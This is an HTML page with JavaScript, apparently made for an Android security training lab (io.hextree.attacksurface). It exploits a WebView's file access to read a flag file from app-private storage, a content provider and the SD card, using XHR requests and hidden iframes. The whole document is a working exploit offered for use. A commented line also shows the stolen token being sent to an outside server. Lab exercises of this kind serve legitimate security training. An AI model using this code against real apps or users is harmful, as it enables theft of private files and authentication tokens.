<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>WebView File Leak Demo</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    button { padding: 10px 20px; font-size: 16px; margin-bottom: 20px; }
    #status { margin-top: 15px; font-weight: bold; }
    pre { background: #f4f4f4; padding: 10px; border-radius: 8px; max-height: 200px; overflow-y: auto; }
  </style>
</head>
<body>
  <h2>WebView File Leak Exploit</h2>
  <button onclick="startAttack()">ðŸš€ Start Attack</button>
  <div id="status">Idle...</div>
  <pre id="log"></pre>

  <script>
    // List of possible file paths to try
    const filePaths = [
      "file:///data/data/io.hextree.attacksurface/files/flag39.txt",
      "content://io.hextree.attacksurface/flag39",
      "file:///sdcard/Download/flag39.txt"
    ];

    let tokenFound = false;

    function log(msg) {
      console.log(msg);
      document.getElementById("log").textContent += msg + "\n";
    }

    // Leak using XMLHttpRequest
    function leakFileXHR(url) {
      try {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.onreadystatechange = function () {
          if (xhr.readyState === 4) {
            if (xhr.status === 200 && xhr.responseText && !tokenFound) {
              log("[XHR] Success at " + url);
              document.getElementById("status").innerHTML = "Token found via XHR: " + xhr.responseText.substring(0, 15) + "...";
              attemptAuth(xhr.responseText.trim());
              tokenFound = true;
            } else {
              log("[XHR] Failed at " + url + " (status " + xhr.status + ")");
            }
          }
        };
        xhr.onerror = () => log("[XHR] Error fetching " + url);
        xhr.send();
      } catch (e) {
        log("[XHR] Exception for " + url + ": " + e);
      }
    }

    // Leak using hidden iframe
    function leakFileIframe(url) {
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.onload = () => {
        try {
          const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
          if (!iframeDoc || tokenFound) return;
          const textContent = iframeDoc.body ? iframeDoc.body.innerText : iframeDoc.documentElement.innerHTML;
          if (textContent && textContent.trim() && !tokenFound) {
            log("[Iframe] Success at " + url);
            document.getElementById("status").innerHTML = "Token found via iframe: " + textContent.substring(0, 15) + "...";
            attemptAuth(textContent.trim());
            tokenFound = true;
          }
        } catch (e) {
          log("[Iframe] Cannot read iframe for " + url + " (" + e + ")");
        }
      };
      iframe.onerror = () => log("[Iframe] Load error for " + url);
      iframe.src = url;
      document.body.appendChild(iframe);
    }

    // Simulated authentication attempt
    function attemptAuth(token) {
      log("Attempting authentication with token: " + token);
      // Normally you'd send token back to your server:
      // fetch("https://yourserver/receive?token=" + encodeURIComponent(token))
    }

    // Start scanning files
    function startAttack() {
      document.getElementById("status").innerHTML = "Starting file leak attempts...";
      filePaths.forEach((path, i) => {
        setTimeout(() => {
          log("Trying: " + path);
          leakFileXHR(path);
          leakFileIframe(path);
        }, i * 400);
      });
    }
  </script>
</body>
</html>
